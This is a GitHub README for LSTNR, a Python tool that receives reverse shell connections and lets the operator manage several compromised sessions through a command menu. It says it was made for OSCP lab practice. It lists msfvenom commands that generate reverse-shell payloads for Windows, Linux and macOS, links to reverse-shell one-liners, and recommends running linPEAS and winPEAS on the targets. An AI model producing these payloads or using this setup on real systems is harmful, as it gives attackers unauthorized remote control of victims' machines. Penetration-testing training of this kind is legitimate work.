# LSTNR
Python script that receives reverse shell connections from remote devices. 

Remote devices can be managed from a Command Line Interface (CLI).

<img width="574" alt="Screenshot 2025-03-04 at 8 49 53 PM" src="https://github.com/user-attachments/assets/0092ba85-1ef6-4d0b-8bd7-39db42a9bc1d" />

FYI: Using `rlwrap` will allow your CLI history remain intact while working.

# DISCLAIMER
This is only for testing purposes, not intended for anything illegal. I was testing out ways to manage multiple connections while doing the OSCP labs. #Hobbies

# Download LSTNR

```
git clone github.com/bwithe/LSNTR

cd lstnr
```

# USAGE

1. Start LSTNR
    - `python3 lstnr.py -p <PORT_TO_LISTEN>`
- MENU COMMANDS
    - `ls` : lists connected clients
    - `cs <ID>` : connects to that session
    - `exit` : will terminate all sessions and stop the script
- SESSION COMMANDS
    - `CTRL+C` or `bs` : backgrounds the active session
    - `exit` or `die` : while in a session will terminate it

2. Have CLIENT connect to LSTNR
    - Best options that work with `lstnr.py`
        - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f exe -o rev.exe`
        - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f dll -o rev.dll`
        - Linux: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f elf -o rev.elf`
        - MacOS: `msfvenom -p osx/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f macho -o rev.macho`
    - You can use any of the methods found on https://www.revshells.com
        - Windows: `Powershell #3 (Base64)`
        - Linux: `Bash -i`
        - MacOS: `python3`

# Screenshot examples:

- Starting the listener

<img width="574" alt="Screenshot 2025-03-04 at 8 49 53 PM" src="https://github.com/user-attachments/assets/14e90926-98c6-40b9-85af-ec4dac67c5f5" />

- Press any key to get a list of commands, or type `?` or `help`

<img width="729" alt="Screenshot 2025-03-04 at 8 54 01 PM" src="https://github.com/user-attachments/assets/652b6b80-ccfb-49cc-bb31-399716c7aa52" />

- List any active sessions

<img width="337" alt="Screenshot 2025-03-01 at 9 10 41 PM" src="https://github.com/user-attachments/assets/aeb6c1ee-34c7-4261-b070-55e42f9e7855" />

- When a session is established

<img width="823" alt="Screenshot 2025-03-04 at 8 54 26 PM" src="https://github.com/user-attachments/assets/c0fa029a-0e1f-4639-8f31-77bfbae61805" />

- Connecting to a session and runnning commands

<img width="609" alt="Screenshot 2025-03-04 at 8 54 59 PM" src="https://github.com/user-attachments/assets/71c5985d-1828-41b0-b8d9-e5a3a9bc03de" />

- Background a session with `bs` or `CTRL+C`

<img width="400" alt="Screenshot 2025-03-04 at 8 55 53 PM" src="https://github.com/user-attachments/assets/99dc6c4c-e0da-498d-8ab1-5d68a824cd55" />

- Once you've received other connections, `ls` will always verify

<img width="847" alt="Screenshot 2025-03-04 at 8 56 14 PM" src="https://github.com/user-attachments/assets/b77d5bef-cc55-4e9f-8949-da6d6a1537a3" />

- Example of a Windows machine connected

<img width="711" alt="Screenshot 2025-03-04 at 8 56 27 PM" src="https://github.com/user-attachments/assets/08819944-4c25-4b30-a104-cec389fb44c4" />

- Kill an individual session `exit`

<img width="613" alt="Screenshot 2025-03-04 at 8 57 04 PM" src="https://github.com/user-attachments/assets/a37eee21-7893-452d-b904-c271e5a62096" />

- To kill all sessions, type `exit` at the main menu `lstnr$`

<img width="307" alt="Screenshot 2025-03-04 at 8 57 27 PM" src="https://github.com/user-attachments/assets/76199bbf-4bb9-4ef7-8b8f-be4730336def" />

- LSTNR also keeps a session and command log

<img width="835" alt="Screenshot 2025-03-04 at 8 57 46 PM" src="https://github.com/user-attachments/assets/f958f90e-6782-4b42-abe5-a7ef13821b6f" />

# RECOMMENDED TIPS
- If you plan on running a command with a long exepected output, such as a `linPEAS.sh` or `winPEAS.exe`; run them in the background and write to a file, and pull the file.
    - This helps if you are also having issues

# TROUBLESHOOTING
- If a session hangs, background the session with `CTRL+C` and then reconnect.
    - If commands stop working all together, reconnect to the session and exit, then re-run the reverse shell from the client machine.
- If you are having issues please feel free to reach out
